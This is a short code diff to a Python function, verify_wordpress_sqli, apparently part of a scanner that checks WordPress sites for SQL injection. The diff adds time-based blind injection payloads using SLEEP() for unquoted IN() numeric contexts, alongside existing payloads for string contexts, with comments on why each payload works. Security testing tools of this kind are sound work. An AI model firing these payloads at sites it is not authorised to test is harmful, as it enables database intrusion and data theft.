@@ -3287,6 +3287,10 @@ def verify_wordpress_sqli(
             # BETWEEN-context: avoids '--' that breaks unclosed string literals inside SQL functions.
             # Works in: BETWEEN '$from X' AND '$to Y', DATE('$from'), and standard WHERE '$col'.
             (f"1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1", f"1' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) AND '1"),
+            # IN()-numeric context: no trailing comment because '--' would comment out the closing ')'.
+            # Works in: WHERE col IN ($value) when value is used without quotes.
+            (f"{orig_value} AND SLEEP(5)", f"{orig_value} AND SLEEP(0)"),
+            (f"{orig_value} AND (SELECT IF(1=1,SLEEP(5),0))", f"{orig_value} AND (SELECT IF(1=2,SLEEP(5),0))"),
         ]
         timing_tried = []
         timing_consistent = 0
